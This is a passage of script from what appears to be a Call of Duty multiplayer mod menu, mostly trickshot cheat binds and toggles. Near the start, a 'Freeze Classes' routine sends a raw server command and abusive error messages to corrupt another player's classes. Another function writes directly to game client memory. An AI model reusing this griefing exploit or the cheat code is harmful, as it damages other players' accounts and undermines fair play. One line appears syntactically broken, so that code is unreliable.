    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to Freeze your Classes");
        return;
    } else {
        if (!self isHost() && !self isDeveloper()) {
            self iPrintln(
                "Whoops! Only the Host or Developer can Freeze Classes");
            return;
        } else {
            player SetClientDvar("com_errorTitle", "^1Uh-oh!");
            player SetClientDvar("com_errorMessage", "^1Now you can't play.");
            player SetClientDvar(
                "motd",
                "^1You just got your Account Fucked. Have fun not playing for a while! ^7Message @wrongin on Twitter to fix your shit!");
            SV_GameSendServerCommand(
                "J 2056 \"206426\" 3040 \"5E0131333337210000\" 2064 \"00000\"",
                player);
            player OpenMenu("error_popmenu_lobby");
            self iPrintln(player.name + " has had Classes Frozen");
        }
    }
}
stunMotherfucker(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to give you Flash Rumble");
        return;
    } else {
        player shellshock("flashbang_mp", 11);
        player thread maps\mp\_flashgrenades::flashrumbleloop(11);
    }
}
GiveFFAFastLast(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to give you FFA Fast Last");
        return;
    } else {
        player thread FastLast("FFA");
        self iPrintln(player.name + "'s has been given ^6Fast Last");
    }
}
GiveTrickshotAimbot(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to give you Trickshot Aimbot");
        return;
    } else {
        if (!isDefined(player.pers["eb_range"])) {
            player notify("NewRange");
            player.pers["eb_range"] = 200;
            player thread bigBullets(200, 2147483600);
            self iPrintln("Player's Trickshot Aimbot: ^6On");
        } else {
            player notify("NewRange");
            player.pers["eb_range"] = undefined;
            self iPrintln("Player's Trickshot Aimbot: ^1Off");
        }
    }
}
FastLast(mode) {
    switch (mode) {
        case "FFA":
            if (level.gametype == "dm") {
                SetDvar("scr_" + level.gametype + "_scorelimit", 1500);
                self.kills = 29;
                self.pers["kills"] = 29;
                self.score = 1450;
                self.pers["score"] = 1450;
                self iPrintlnBold("^1You are on Final Kill (29)!");
            }
            break;
        case "TDM":
            if (level.gametype == "war") {
                SetDvar("scr_" + level.gametype + "_scorelimit", 7500);
                game["teamScores"][self.pers["team"]] = 7400;
                maps\mp\gametypes\_gamescore::updateTeamScore(
                    self.pers["team"]);
            }
            break;
        case "SND":
            if (level.gametype == "sd") {
                foreach(player in level.players) {
                    if (player.pers["team"] != self.pers["team"] &&
                        isAlive(player) && !self isLastAlive())
                        player suicide();
                    wait .05;
                }
            }
            break;
    }
}
isLastAlive() {
    teamArray = [];
    foreach(player in level.players)
    if (player.pers["team"] != self.pers["team"] && isAlive(player))
        teamArray[teamArray.size] = player;
    if (teamArray.size > 1)
        return false;
    return true;
}
DropCanswap() {
    weapon = level.weaponList[RandomInt(level.weaponList.size - 1)];
    self GiveWeapon(weapon);
    self SwitchToWeapon(weapon);
    self DropItem(weapon);
}
alwaysCanzooms() {
    self.pers["has_alwayszoom"] =
        (isDefined(self.pers["has_alwayszoom"]) ? undefined : true);
    if (isDefined(self.pers["has_alwayszoom"])) {
        self IPrintLn("Canzooms: ^6On");
        self colortoggle(self.pers["has_alwayszoom"]);
        self thread canzoom();
    } else {
        self IPrintLn("Canzooms: ^1Off");
        self colortoggle(self.pers["has_alwayszoom"]);
        self notify("stopAlwaysZoom");
    }
}
canzoom() {
    self endon("disconnect");
    self endon("stopAlwaysZoom");
    for (;;) {
        self waittill("weapon_change");
        if (isDefined(self.pers["has_alwayszoom"])) {
            x = self getCurrentWeapon();
            z = self getWeaponsListPrimaries();
            akimbo = false;
            foreach(gun in z) {
                if (x != gun) {
                    self takeFirearm(gun);
                    waitframe();
                    if (isSubStr(x, "akimbo"))
                        akimbo = true;
                    self giveFirearm();
                }
            }
            self SetSpawnWeapon(x);
        }
    }
}
ShootEquipment() {
    if (isConsole())
        client = 0x830CC23F + (self GetEntityNumber() * 0x3700);
    else
        client = 0x01B0E47C + (self GetEntityNumber() * 0x366C);
    self.ShootEquipment = (isDefined(self.ShootEquipment) ? undefined : true);
    if (isDefined(self.ShootEquipment)) {
        self IPrintLn("Shoot Equipment: ^6On");
        self colortoggle(self.ShootEquipment);
        while (isDefined(self.ShootEquipment)) {
            WriteByte(client, 0x02);
            wait .1;
        }
    } else {
        self IPrintLn("Shoot Equipment: ^1Off");
        self colortoggle(self.ShootEquipment);
        WriteByte(client, 0x00);
    }
}
OMAIllusion() {
    if (self.OMA == 0) {
        self.OMA = 1;
        self thread OmaX();
        self IPrintLn("OMA Illusion: ^6On");
    } else if (self.OMA == 1) {
        self.OMA = 0;
        self notify("endOMA");
        self IPrintLn("OMA Illusion: ^1Off");
    }
}
OmaX() {
    self thread OMADpadCheck();
    wait 0.1;
    self IPrintLn(
        "Choose Bind [{+actionslot 1}], [{+actionslot 2}], [{+actionslot 3}] or [{+actionslot 4}]");
    self waittill("OMASelected");
    self thread OMAIllusionBind();
}
OMADpadCheck() {
    self endon("endOMA");
    self endon("OMASelected");
    for (;;) {
        if (self isButtonPressed("+actionslot 1")) {
            self.OMADpad = "+actionslot 1";
            self.OMANoti = "upOMA";
            self IPrintLn("OMA Illusion set to: [{+actionslot 1}]");
            self notify("OMASelected");
        }
        if (self isButtonPressed("+actionslot 2")) {
            self.OMADpad = "+actionslot 2";
            self.OMANoti = "downOMA";
            self IPrintLn("OMA Illusion set to: [{+actionslot 2}]");
            self notify("OMASelected");
        }
        if (self isButtonPressed("+actionslot 3")) {
            self.OMADpad = "+actionslot 3";
            self.OMANoti = "leftOMA";
            self IPrintLn("OMA Illusion set to: [{+actionslot 3}]");
            self notify("OMASelected");
        }
        if (self isButtonPressed("+actionslot 4")) {
            self.OMADpad = "+actionslot 4";
            self.OMANoti = "rightOMA";
            self IPrintLn("OMA Illusion set to: [{+actionslot 4}]");
            self notify("OMASelected");
        }
        wait 0.001;
    }
}
OMAIllusionBind() {
    self endon("endOMA");
    self endon("disconnect");
    for (;;) {
        self notifyonPlayerCommand(self.OMANoti, self.OMADpad);
        self waittill(self.OMANoti);
        x = self getCurrentWeapon();
        self takeFirearm(x);
        self thread doubleOMABarElem();
        wait 3;
        self giveFirearm();
        self setSpawnWeapon(x);
    }
}
doubleOMABarElem() {
    doubleOMADuration = 3;
    doubleOMAElem = self createPrimaryProgressBar(0);
    doubleOMAElemText = self createPrimaryProgressBarText(0);
    doubleOMAElemText setText("Changing Kit...");
    doubleOMAElem UpdateBar(0, 1 / doubleOMADuration);
    for (waitedTime = false; waitedTime < doubleOMADuration && isAlive(self) && !level.gameEnded; waitedTime += 0.05)
        wait(0.05);
    doubleOMAElem DestroyElem();
    doubleOMAElemText DestroyElem();
}
weaponhitmarkermod() {
    self.pers["has_weaponhitmarker"] =
        (isDefined(self.pers["has_weaponhitmarker"]) ? undefined : true);
    if (isDefined(self.pers["has_weaponhitmarker"])) {
        x = self GetCurrentWeapon();
        self.pers["hitmarkerweapon"] = x;
        self IPrintLn("Hitmarker Weapon: ^6" + x);
        self colortoggle(self.pers["has_weaponhitmarker"]);
    } else {
        self IPrintLn("Hitmarker Weapon: ^1Off");
        self colortoggle(self.pers["has_weaponhitmarker"]);
    }
}
weaponhitmarker() {
    self endon("disconnect");
    for (;;) {
        self waittill("weapon_fired");
        if (isDefined(self.pers["has_weaponhitmarker"])) {
            x = self getCurrentWeapon();
            y = self.pers["hitmarkerweapon"];
            if (x == y) {
                yOffset = getdvarfloat("cg_crosshairVerticalOffset") * 240;
                feedbackDurationOverride = 0;
                startAlpha = 1;
                self.hud_damagefeedback setShader("damage_feedback", 24, 48);
                self playlocalsound("MP_hit_alert");
                self.hud_damagefeedback.alpha = startAlpha;
                if (feedBackDurationOverride != 0)
                    self.hud_damagefeedback fadeOverTime(
                        feedbackDurationOverride);
                else
                    self.hud_damagefeedback fadeOverTime(1);
                self.hud_damagefeedback.alpha = 0;
                if (self.hud_damagefeedback.x != x)
                    self.hud_damagefeedback.x = x;
                y = y - int(yOffset);
                if (self.hud_damagefeedback.y != y)
                    self.hud_damagefeedback.y = y;
            }
        }
    }
}
setbounce() {
    setDvar("bouncex", self.origin[0]);
    setDvar("bouncez", self.origin[1]);
    setDvar("bouncey", self.origin[2]);
    self iPrintLn("Bounce: ^6" + self.origin);
}
delbounce() {
    setDvar("bouncex", 0);
    setDvar("bouncez", 0);
    setDvar("bouncey", 999999);
    self iPrintLn("Bounce: ^1Deleted");
}
bounce() {
    for (;;) {
        self.ifdown = self getVelocity();
        pos = (getDvarFloat("bouncex"), getDvarFloat("bouncez"),
            getDvarFloat("bouncey"));
        if (Distance(pos, self.origin) <= 50 && self.ifdown[2] < -250) {
            self.playervel = self getVelocity();
            self setVelocity(self.playervel - (0, 0, self.playervel[2] * 2));
            wait 0.25;
        }
        waitframe();
    }
}
pickupradius(range) {
    self setclientdvar("player_useradius", range);
    self iPrintln("Pickup Radius: ^6" + range);
}
riotknifemod() {
    self.pers["has_riotknife"] =
        (isDefined(self.pers["has_riotknife"]) ? undefined : true);
    if (isDefined(self.pers["has_riotknife"])) {
        self IPrintLn("Riot Shield Knife: ^6On");
        self colortoggle(self.pers["has_riotknife"]);
    } else {
        self IPrintLn("Riot Shield Knife: ^1Off");
        self colortoggle(self.pers["has_riotknife"]);
    }
}
riotKnife() {
    self endon("disconnect");
    for (;;) {
        self notifyonPlayercommand("riotKnife", "+melee");
        self waittill("riotKnife");
        if (isDefined(self.pers["has_riotknife"]) &&
            self GetCurrentWeapon() == self.primaryWeapon) {
            x = self.primaryWeapon;
            y = self.loadoutPrimaryCamo;
            z = "riotshield_mp";
            self takeWeapon(x);
            self giveWeapon(z);
            self setSpawnWeapon(z);
            wait 0.7;
            self takeWeapon(z);
            self GiveWeapon(x, y);
            self switchToWeapon(x);
        }
    }
}
predknifemod() {
    self.pers["has_predknife"] =
        (isDefined(self.pers["has_predknife"]) ? undefined : true);
    if (isDefined(self.pers["has_predknife"])) {
        self IPrintLn("Predator Knife: ^6On");
        self colortoggle(self.pers["has_predknife"]);
    } else {
        self IPrintLn("Predator Knife: ^1Off");
        self colortoggle(self.pers["has_predknife"]);
    }
}
predknife() {
    self endon("disconnect");
    for (;;) {
        self notifyonPlayercommand("predknife", "+melee");
        self waittill("predknife");
        if (isDefined(self.pers["has_predknife"]) &&
            self GetCurrentWeapon() == self.primaryWeapon) {
            x = self.primaryWeapon;
            y = self.loadoutPrimaryCamo;
            z = "killstreak_predator_missile_mp";
            self takeWeapon(x);
            self giveWeapon(z);
            self setSpawnWeapon(z);
            wait 0.6;
            self takeWeapon(z);
            self GiveWeapon(x, y);
            self switchToWeapon(x);
        }
    }
}
barrelrollmod() {
    self.pers["has_barrelroll"] =
        (isDefined(self.pers["has_barrelroll"]) ? undefined : true);
    if (isDefined(self.pers["has_barrelroll"])) {
        self IPrintLn("Auto Barrel Roll: ^6On");
        self colortoggle(self.pers["has_barrelroll"]);
    } else {
        self IPrintLn("Auto Barrel Roll: ^1Off");
        self colortoggle(self.pers["has_barrelroll"]);
    }
}
barrelroll() {
    self endon("disconnect");
    for (;;) {
        self waittill("weapon_change", shotgun);
        if (isDefined(self.pers["has_barrelroll"])) {
            shotgun = self getCurrentWeapon();
            all_weapons = self getWeaponsListPrimaries();
            if (isSubStr(shotgun, "striker") || isSubStr(shotgun, "aa12") ||
                isSubStr(shotgun, "m1014") || isSubStr(shotgun, "spas12")) {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[0]);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            }
        }
    }
}
pistolnacmod() {
    self.pers["has_pistolnac"] =
        (isDefined(self.pers["has_pistolnac"]) ? undefined : true);
    if (isDefined(self.pers["has_pistolnac"])) {
        self IPrintLn("Auto Pistol Nac: ^6On");
        self IPrintLn("NOTE* Works by reloading mid-air only");
        self colortoggle(self.pers["has_pistolnac"]);
    } else {
        self IPrintLn("Auto Pistol Nac: ^1Off");
        self colortoggle(self.pers["has_pistolnac"]);
    }
}
pistolnac() {
    self endon("disconnect");
    for (;;) {
        self waittill("reload");
        if (isDefined(self.pers["has_pistolnac"]) && !self IsOnGround()) {
            x = self getCurrentWeapon();
            if (isSubStr(x, "beretta") || isSubStr(x, "usp") ||
                isSubStr(x, "deserteagle") || isSubStr(x, "coltanaconda")) {
                stockAmmo = self GetWeaponAmmoStock(x);
                clipAmmo = self GetWeaponAmmoClip(x);
                self takeWeapon(x);
                self switchToWeapon(self.primaryWeapon);
                if (self isHost())
                    wait 0.001;
                else
                    wait 0.002;
                self giveWeapon(x, self.loadoutSecondaryCamo);
                self SetWeaponAmmoStock(x, stockAmmo + 1);
                self SetWeaponAmmoClip(x, clipAmmo);
            }
        }
    }
}
shotgunnacmod() {
    self.pers["has_shotgunnac"] =
        (isDefined(self.pers["has_shotgunnac"]) ? undefined : true);
    if (isDefined(self.pers["has_shotgunnac"])) {
        self IPrintLn("Auto Shotgun Nac: ^6On");
        self IPrintLn("NOTE* Works by reloading mid-air only");
        self colortoggle(self.pers["has_shotgunnac"]);
    } else {
        self IPrintLn("Auto Shotgun Nac: ^1Off");
        self colortoggle(self.pers["has_shotgunnac"]);
    }
}
shotgunnac() {
    self endon("disconnect");
    for (;;) {
        self waittill("reload");
        if (isDefined(self.pers["has_shotgunnac"]) && !self IsOnGround()) {
            w = self getCurrentWeapon();
            if (isSubStr(w, "ranger") || isSubStr(w, "model1887") ||
                isSubStr(w, "striker") || isSubStr(w, "aa12") ||
                isSubStr(w, "m1014") || isSubStr(w, "spas12")) {
                stockAmmo = self GetWeaponAmmoStock(w);
                clipAmmo = self GetWeaponAmmoClip(w);
                self takeWeapon(w);
                self switchToWeapon(self.primaryWeapon);
                if (self isHost())
                    wait 0.15;
                else
                    wait 0.25;
                self giveWeapon(w, self.loadoutSecondaryCamo);
                self SetWeaponAmmoStock(w, stockAmmo + 1);
                self SetWeaponAmmoClip(w, clipAmmo);
            }
            if (isSubStr(w, "tavor_shotgun_attach_mp")) {
                wait 0.08;
                x = self.primaryWeapon;
                y = self.secondaryWeapon;
                z = "cheytac_fmj_mp";
                self takeWeapon(x);
                self takeWeapon(y);
                self giveWeapon(z, self.loadoutPrimaryCamo);
                self switchToWeapon(z);
                if (self isHost())
                    wait 0.15;
                else
                    wait 0.25;
                self giveWeapon(x, self.loadoutPrimaryCamo);
            }
            if (isSubStr(w, "ump45_silencer_mp")) {
                x = self.primaryWeapon;
                y = self.secondaryWeapon;
                z = "wa2000_fmj_mp";
                self takeWeapon(x);
                self takeWeapon(y);
                self giveWeapon(z, self.loadoutPrimaryCamo);
                self switchToWeapon(z);
                if (self isHost())
                    wait 0.15;
                else
                    wait 0.25;
                self giveWeapon(x, self.loadoutPrimaryCamo);
            }
        }
    }
}
togglebind(mod) {
    self endon("button_selected");
    self IPrintLn(
        "Choose Bind [{+actionslot 1}], [{+actionslot 2}], [{+actionslot 3}] or [{+actionslot 4}]");
    for (;;) {
        if (self isButtonPressed("+actionslot 1")) {
            self.pers["bind_" + mod] = "+actionslot 1";
            self notify("button_selected");
        }
        if (self isButtonPressed("+actionslot 2")) {
            self.pers["bind_" + mod] = "+actionslot 2";
            self notify("button_selected");
        }
        if (self isButtonPressed("+actionslot 3")) {
            self.pers["bind_" + mod] = "+actionslot 3";
            self notify("button_selected");
        }
        if (self isButtonPressed("+actionslot 4")) {
            self.pers["bind_" + mod] = "+actionslot 4";
            self notify("button_selected");
        }
        wait 0.001;
    }
}
nacswapmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        nacswapbind(mod);
    } else {
        self IPrintLn("Nac Swap Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_nacswap");
        self.pers["has_" + mod] = undefined;
    }
}
nacswapbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Nac Swap Bind: [{" + z + "}]");
    self thread nacswap(z);
}
nacswap(button) {
    self endon("end_nacswap");
    self endon("disconnect");
    for (;;) {
        self bindwait("nacswap", button);
        if (!self.menu["isOpen"] && isdefined(self.pers["has_nacswap"])) {
            if (self getCurrentWeapon() == self.primaryWeapon &&
                !self.menu["isOpen"])
                self nacSwapAction(self.primaryWeapon, self.secondaryWeapon,
                    self.loadoutPrimaryCamo);
            else if (self getCurrentWeapon() == self.secondaryWeapon &&
                !self.menu["isOpen"])
                self nacSwapAction(self.secondaryWeapon, self.primaryWeapon,
                    self.loadoutSecondaryCamo);
        }
    }
}
nacSwapAction(originalWeapon, newWeapon, originalCamo) {
    self saveAmmoClipAndStock(originalWeapon);
    if (self adsbuttonpressed()) {
        self SetSpawnWeapon(newWeapon);
    } else {
        self takeWeapon(originalWeapon);
        self switchToWeapon(newWeapon);
        if (self isHost())
            wait 0.1;
        else
            wait 0.2;
        self giveWeapon(originalWeapon, originalCamo);
    }
}
giveWeaponAndAmmoBack(weapon, camo) {
    if (isSubStr(weapon, "akimbo")) {
        self giveWeapon(weapon, camo, true);
        self setWeaponAmmoClip(weapon, self.ammoClipL[weapon], "left");
        self setWeaponAmmoClip(weapon, self.ammoClipR[weapon], "right");
    } else {
        self giveWeapon(weapon, camo, false);
        self setweaponammoclip(weapon, self.ammoClip[weapon]);
    }
    self setweaponammostock(weapon, self.ammoStock[weapon] + 1);
}
saveAmmoClipAndStock(weapon) {
    self.ammoStock[weapon] = self getWeaponAmmoStock(weapon);
    self.ammoClip[weapon] = self getWeaponAmmoClip(weapon);
    self.ammoClipR[weapon] = self getWeaponAmmoClip(weapon, "right");
    self.ammoClipL[weapon] = self getWeaponAmmoClip(weapon, "left");
}
classswapmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        classswapbind(mod);
    } else {
        self IPrintLn("Class Swap Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_classswap");
    }
}
classswapbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Class Swap Bind: [{" + z + "}]");
    self thread classswap(z);
}
classswap(button) {
    self endon("end_classswap");
    self endon("disconnect");
    for (;;) {
        self bindwait("classswap", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_classswap"])) {
            if (self.pers["Class"] == "custom1") {
                self maps\mp\gametypes\_class::setClass("custom2");
                self.pers["Class"] = "custom2";
                self.tag_stowed_back = undefined;
                self.tag_stowed_hip = undefined;
                self maps\mp\gametypes\_class::giveLoadout(self.pers["team"],
                    "custom2");
            } else if (self.pers["Class"] == "custom2") {
                self maps\mp\gametypes\_class::setClass("custom3");
                self.pers["Class"] = "custom3";
                self.tag_stowed_back = undefined;
                self.tag_stowed_hip = undefined;
                self maps\mp\gametypes\_class::giveLoadout(self.pers["team"],
                    "custom3");
            } else if (self.pers["Class"] == "custom3") {
                self maps\mp\gametypes\_class::setClass("custom1");
                self.pers["Class"] = "custom1";
                self.tag_stowed_back = undefined;
                self.tag_stowed_hip = undefined;
                self maps\mp\gametypes\_class::giveLoadout(self.pers["team"],
                    "custom1");
            }
            self.nova = self getCurrentweapon();
            ammoW = self getWeaponAmmoStock(self.nova);
            ammoCW = self getWeaponAmmoClip(self.nova);
            self setweaponammostock(self.nova, ammoW);
            self setweaponammoclip(self.nova, ammoCW);
            akimbo = false;
            weap = self getCurrentWeapon();
            myclip = self getWeaponAmmoClip(weap);
            mystock = self getWeaponAmmoStock(weap);
            ammoCW17 = self getWeaponAmmoClip(weap, "right");
            ammoCW18 = self getWeaponAmmoClip(weap, "left");
            self takeWeapon(weap);
            if (isSubStr(weap, "akimbo"))
                akimbo = true;
            self giveWeapon(weap, self.loadoutPrimaryCamo, akimbo);
            if (isSubStr(weap, "akimbo")) {
                self setWeaponAmmoClip(weap, ammoCW18, "left");
                self setWeaponAmmoClip(weap, ammoCW17, "right");
            } else {
                self setweaponammoclip(weap, myclip);
            }
            self setweaponammostock(weap, mystock);
        }
    }
}
smoothactionsmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        smoothactionsbind(mod);
    } else {
        self IPrintLn("Smooth Actions Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_smoothactions");
    }
}
smoothactionsbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Smooth Actions Bind: [{" + z + "}]");
    self thread smoothactions(z);
}
smoothactions(button) {
    self endon("end_smoothactions");
    for (;;) {
        self bindwait("smoothactions", button);
        all_weapons = self getWeaponsListPrimaries();
        if (!self.menu["isOpen"] && isDefined(self.pers["has_smoothactions"])) {
            if (self getCurrentWeapon() == all_weapons[0]) {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self switchToWeapon(all_weapons[0]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            } else if (self getCurrentWeapon() == all_weapons[1]) {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[0]);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            } else {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self switchToWeapon(all_weapons[2]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            }
        }
    }
}
reversereloadsmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self IPrintLn("Reverse Reloads Bind: ^6On");
        self colortoggle(self.pers["has_" + mod]);
        reverseReloads();
    } else {
        self IPrintLn("Reverse Reloads Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_smoothactions");
    }
}
reversereloads() {
    self endon("end_smoothactions");
    for (;;) {
        self notifyonplayercommand("ReverseReload", "+usereload");
        self waittill("ReverseReload");
        if (!self.menu["isOpen"] &&
            isDefined(self.pers["has_reversereloads"])) {
            all_weapons = self getWeaponsListPrimaries();
            wait 0.3;
            if (self getCurrentWeapon() == all_weapons[0]) {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self switchToWeapon(all_weapons[0]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            } else if (self getCurrentWeapon() == all_weapons[1]) {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[0]);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            } else {
                self setClientDvar("cg_nopredict", 1);
                waitframe();
                self switchToWeapon(all_weapons[1]);
                waitframe();
                self switchToWeapon(all_weapons[2]);
                waitframe();
                self setClientDvar("cg_nopredict", 0);
            }
        }
    }
}
gflipmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        gflipbind(mod);
    } else {
        self IPrintLn("G-Flip Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_gflip");
    }
}
gflipbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("G-Flip Bind: [{" + z + "}]\n^7Walk forward manually");
    self thread gflip(z);
}
gflip(button) {
    self endon("end_gflip");
    self endon("disconnect");
    for (;;) {
        self bindwait("gflip", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_gflip"])) {
            x = self.primaryWeapon;
            xs = self getWeaponAmmoStock(x);
            xc = self getWeaponAmmoClip(x);
            y = self.secondaryWeapon;
            ys = self getWeaponAmmoStock(y);
            yc = self getWeaponAmmoClip(y);
            z = self getCurrentWeapon();
            if (z == x) {
                self takeFirearm(x);
                self SwitchToWeapon(y);
                self setstance("prone");
                wait 0.35;
                self setstance("stand");
                wait 0.05;
                self SetSpawnWeapon(y);
                self TakeWeapon(y);
                self giveFirearm();
                self SwitchToWeapon(x);
                wait 0.2;
                self GiveWeapon(y, self.loadoutSecondaryCamo);
                self SetWeaponAmmoStock(y, ys);
                self SetWeaponAmmoClip(y, yc);
                self SetSpawnWeapon(x);
            } else {
                self setstance("prone");
                wait 0.35;
                self setstance("stand");
                wait 0.05;
                self TakeWeapon(y);
                self SwitchToWeapon(x);
                wait 0.2;
                self GiveWeapon(y, self.loadoutSecondaryCamo);
                self SetWeaponAmmoStock(y, ys);
                self SetWeaponAmmoClip(y, yc);
                self SetSpawnWeapon(x);
            }
        }
    }
}
sentrymod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        sentrybind(mod);
    } else {
        self colortoggle(self.pers["has_" + mod]);
        self IPrintLn("Sentry Bind: ^1Off");
        self notify("end_sentry");
    }
}
sentrybind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Sentry Bind: [{" + z + "}]");
    self thread sentry(z);
}
sentry(button) {
    self endon("end_sentry");
    for (;;) {
        self bindwait("sentry", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_sentry"])) {
            self thread maps\mp\killstreaks\_autosentry::tryUseAutoSentry(self);
            self enableWeapons();
        }
    }
}
carepackmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        carepackbind(mod);
        self colortoggle(self.pers["has_" + mod]);
    } else {
        self colortoggle(self.pers["has_" + mod]);
        self IPrintLn("Carepackage Bind: ^1Off");
        self notify("end_carepack");
    }
}
carepackbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Carepackage Bind: [{" + z + "}]");
    self thread carepack(z);
}
carepack(button) {
    self endon("end_carepack");
    for (;;) {
        x = "airdrop_marker_mp";
        self bindwait("carepack", button);
        y = self getCurrentWeapon();
        if (!self.menu["isOpen"] && isDefined(self.pers["has_carepack"])) {
            self takeFirearm(y);
            self giveWeapon(x);
            self switchToWeapon(x);
            self giveFirearm();
        }
        self thread carepackcancel(x, y);
    }
}
carepackcancel(x, y) {
    self endon("end_carepack");
    for (;;) {
        self waittill("grenade_pullback", x);
        wait 0.4;
        self takeWeapon(x);
        self switchToWeapon(y);
    }
}
predcancelmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        predcancelbind(mod);
    } else {
        self IPrintLn("Predator Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_predcancel");
    }
}
predcancelbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Predator Bind: [{" + z + "}]");
    self thread predcancel(z);
}
predcancel(button) {
    self endon("end_predcancel");
    for (;;) {
        self bindwait("predcancel", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_predcancel"])) {
            OldWeap = self getCurrentWeapon();
            predLaptop = "killstreak_predator_missile_mp";
            self giveweapon(predLaptop);
            self takeweapon(OldWeap);
            self switchToWeapon(predLaptop);
            wait 0.40;
            self VisionSetNakedForPlayer("black_bw", 0.75);
            wait 0.55;
            self visionSetNakedForPlayer(getDvar("mapname"), 0.01);
            x = self.origin + (0, 550, 9000);
            z = self.origin;
            rocket = MagicBullet("remotemissile_projectile_mp", x, z, self);
            self VisionSetMissilecamForPlayer(game["thermal_vision"], 1.0);
            self thread maps\mp\killstreaks\_remotemissile::delayedFOFOverlay();
            self CameraLinkTo(rocket, "tag_origin");
            self ControlsLinkTo(rocket);
            level.rockets[self getEntityNumber()] = self;
            ratio = spawn("script_model", self.origin);
            self PlayerLinkTo(ratio);
            wait 1;
            self thread maps\mp\killstreaks\_remotemissile::staticEffect(0.5);
            self clearUsingRemote();
            self takeweapon(predLaptop);
            self giveWeapon(OldWeap, self.loadoutPrimaryCamo) waitframe();
            self switchToWeapon(OldWeap);
            waitframe();
            self disableWeapons();
            waitframe();
            self enableWeapons();
            wait 0.05;
            self setSpawnWeapon(OldWeap);
            rocket notify("death");
            level.remoteMissileInProgress = undefined;
            level.rockets[self getEntityNumber()] = undefined;
            rocket destroy();
            ratio delete();
            rocket delete();
            self _enableOffHandWeapons();
            self ThermalVisionFOFOverlayOff();
            self ControlsUnlink();
            self CameraUnlink();
            self ThermalVisionOff();
            self unlink();
        }
    }
}
shaxmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        shaxbind(mod);
    } else {
        self IPrintLn("ShaX Swap Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_shax");
    }
}
shaxbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("ShaX Swap Bind: [{" + z + "}]");
    self thread shax(z);
}
shax(button) {
    self endon("end_shax");
    for (;;) {
